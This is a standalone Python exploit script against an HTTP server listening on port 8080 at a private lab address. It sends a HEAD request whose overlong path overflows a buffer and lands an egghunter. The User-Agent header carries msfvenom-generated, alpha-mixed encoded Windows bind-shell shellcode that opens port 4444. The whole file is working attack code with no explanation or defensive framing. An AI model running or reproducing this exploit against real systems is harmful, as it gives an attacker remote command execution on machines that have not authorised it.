#!/usr/bin/python

import socket
import os
import sys

hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/alpha_mixed -f c
shellcode = ("\x89\xe0\xda\xcc\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x79\x6c\x68\x68\x6c\x42\x67\x70\x73\x30\x35\x50\x75\x30\x6d"
"\x59\x39\x75\x65\x61\x69\x50\x30\x64\x6c\x4b\x62\x70\x66\x50"
"\x6c\x4b\x73\x62\x64\x4c\x6c\x4b\x72\x72\x77\x64\x4c\x4b\x53"
"\x42\x55\x78\x76\x6f\x38\x37\x70\x4a\x57\x56\x75\x61\x6b\x4f"
"\x4c\x6c\x65\x6c\x43\x51\x71\x6c\x45\x52\x76\x4c\x37\x50\x4f"
"\x31\x4a\x6f\x76\x6d\x65\x51\x6b\x77\x48\x62\x6c\x32\x63\x62"
"\x32\x77\x6e\x6b\x66\x32\x52\x30\x6c\x4b\x71\x5a\x67\x4c\x4c"
"\x4b\x30\x4c\x62\x31\x33\x48\x58\x63\x37\x38\x56\x61\x78\x51"
"\x62\x71\x6c\x4b\x51\x49\x37\x50\x43\x31\x79\x43\x4c\x4b\x52"
"\x69\x37\x68\x38\x63\x66\x5a\x73\x79\x4c\x4b\x37\x44\x4e\x6b"
"\x37\x71\x48\x56\x35\x61\x69\x6f\x4c\x6c\x6a\x61\x6a\x6f\x44"
"\x4d\x75\x51\x7a\x67\x56\x58\x6d\x30\x51\x65\x6a\x56\x33\x33"
"\x43\x4d\x5a\x58\x55\x6b\x71\x6d\x64\x64\x34\x35\x59\x74\x70"
"\x58\x4e\x6b\x51\x48\x64\x64\x33\x31\x4b\x63\x52\x46\x6c\x4b"
"\x36\x6c\x52\x6b\x6e\x6b\x70\x58\x75\x4c\x46\x61\x4a\x73\x4c"
"\x4b\x53\x34\x6e\x6b\x63\x31\x4a\x70\x6d\x59\x43\x74\x67\x54"
"\x46\x44\x73\x6b\x53\x6b\x75\x31\x30\x59\x32\x7a\x62\x71\x49"
"\x6f\x59\x70\x51\x4f\x73\x6f\x31\x4a\x4c\x4b\x67\x62\x78\x6b"
"\x4e\x6d\x73\x6d\x45\x38\x55\x63\x36\x52\x65\x50\x77\x70\x65"
"\x38\x42\x57\x43\x43\x64\x72\x51\x4f\x73\x64\x55\x38\x62\x6c"
"\x34\x37\x66\x46\x64\x47\x49\x6f\x49\x45\x58\x38\x4e\x70\x65"
"\x51\x73\x30\x35\x50\x71\x39\x48\x44\x31\x44\x50\x50\x50\x68"
"\x46\x49\x4d\x50\x62\x4b\x43\x30\x49\x6f\x79\x45\x63\x5a\x55"
"\x58\x61\x49\x56\x30\x68\x62\x6b\x4d\x77\x30\x32\x70\x61\x50"
"\x36\x30\x45\x38\x79\x7a\x76\x6f\x59\x4f\x4b\x50\x6b\x4f\x6b"
"\x65\x6d\x47\x61\x78\x74\x42\x37\x70\x42\x31\x51\x4c\x6e\x69"
"\x58\x66\x51\x7a\x74\x50\x53\x66\x73\x67\x61\x78\x39\x52\x59"
"\x4b\x57\x47\x71\x77\x6b\x4f\x39\x45\x50\x57\x72\x48\x6f\x47"
"\x48\x69\x45\x68\x6b\x4f\x79\x6f\x4b\x65\x52\x77\x62\x48\x70"
"\x74\x4a\x4c\x67\x4b\x39\x71\x4b\x4f\x4a\x75\x33\x67\x4d\x47"
"\x51\x78\x72\x55\x30\x6e\x30\x4d\x53\x51\x49\x6f\x49\x45\x30"
"\x68\x70\x63\x52\x4d\x73\x54\x77\x70\x4f\x79\x48\x63\x32\x77"
"\x61\x47\x73\x67\x66\x51\x4b\x46\x30\x6a\x56\x72\x31\x49\x71"
"\x46\x69\x72\x79\x6d\x32\x46\x39\x57\x73\x74\x57\x54\x65\x6c"
"\x53\x31\x46\x61\x6c\x4d\x57\x34\x66\x44\x52\x30\x79\x56\x33"
"\x30\x67\x34\x42\x74\x46\x30\x36\x36\x71\x46\x63\x66\x67\x36"
"\x70\x56\x50\x4e\x42\x76\x51\x46\x33\x63\x70\x56\x71\x78\x43"
"\x49\x38\x4c\x47\x4f\x6d\x56\x6b\x4f\x49\x45\x4c\x49\x49\x70"
"\x30\x4e\x52\x76\x70\x46\x49\x6f\x50\x30\x55\x38\x45\x58\x6b"
"\x37\x65\x4d\x45\x30\x39\x6f\x4b\x65\x4f\x4b\x4c\x30\x68\x35"
"\x4c\x62\x73\x66\x42\x48\x79\x36\x4d\x45\x4f\x4d\x4f\x6d\x79"
"\x6f\x6b\x65\x75\x6c\x75\x56\x71\x6c\x66\x6a\x6f\x70\x69\x6b"
"\x79\x70\x52\x55\x37\x75\x6f\x4b\x62\x67\x46\x73\x30\x72\x32"
"\x4f\x71\x7a\x47\x70\x71\x43\x79\x6f\x4b\x65\x41\x41"
)

Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
Stage2 = "b33fb33f" + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.16.73.129:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

exp1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp1.connect(("172.16.73.129", 8080))
exp1.send(buffer)
exp1.close()
